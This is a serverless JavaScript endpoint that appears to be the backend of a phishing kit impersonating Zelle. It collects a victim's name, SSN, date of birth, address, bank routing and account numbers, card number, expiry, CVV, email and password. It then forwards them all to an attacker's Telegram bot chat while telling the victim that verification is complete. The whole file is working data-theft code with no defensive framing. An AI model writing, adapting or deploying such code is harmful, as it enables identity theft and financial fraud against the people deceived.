export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const {
            fullName,
            addressStreet,
            addressCity,
            addressState,
            addressZip,
            ssn,
            dob,
            routingNumber,
            accountNumber,
            cardNumber,
            cardExpiry,
            cardCvv,
            email,
            password,
            ipInfo,
            userAgent,
            timestamp
        } = req.body;
        
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Missing Telegram credentials');
            return res.status(500).json({ 
                success: false, 
                error: 'Configuration error - Missing bot credentials' 
            });
        }
        
        const currentTime = new Date(timestamp || Date.now()).toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            dateStyle: 'full',
            timeStyle: 'long'
        });
        
        const message = `🔐 *ZELLE® VERIFICATION ALERT* 🔐
        
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 *PERSONAL INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Full Name:* ${fullName || 'N/A'}
*SSN:* ${ssn || 'N/A'}
*DOB:* ${dob || 'N/A'}

📍 *ADDRESS*
━━━━━━━━━━━━━━━━━━━━━━━━━━
${addressStreet || 'N/A'}, ${addressCity || 'N/A'}, ${addressState || 'N/A'} ${addressZip || 'N/A'}

🏦 *BANK DETAILS*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Routing:* ${routingNumber || 'N/A'}
*Account:* ${accountNumber || 'N/A'}

💳 *CARD INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Card:* ${cardNumber || 'N/A'}
*Expiry:* ${cardExpiry || 'N/A'}
*CVV:* ${cardCvv || 'N/A'}

📧 *EMAIL VERIFICATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Email:* ${email || 'N/A'}
*Password:* ${password || 'N/A'}

🌐 *DEVICE INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*IP Address:* ${ipInfo?.ip || 'Unknown'}
*Location:* ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
*User Agent:* ${userAgent?.substring(0, 100) || 'Unknown'}

━━━━━━━━━━━━━━━━━━━━━━━━━━
🕐 *Timestamp:* ${currentTime}
⚠️ *VERIFICATION COMPLETED* ⚠️`;
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        const data = await response.json();
        
        if (data.ok) {
            console.log('✅ Telegram message sent successfully');
            return res.status(200).json({ 
                success: true, 
                message: 'Verification complete' 
            });
        } else {
            console.error('Telegram API error:', data);
            return res.status(500).json({ 
                success: false, 
                error: data.description || 'Failed to send verification' 
            });
        }
        
    } catch (error) {
        console.error('Server error:', error);
        return res.status(500).json({ 
            success: false, 
            error: error.message || 'Internal server error' 
        });
    }
}
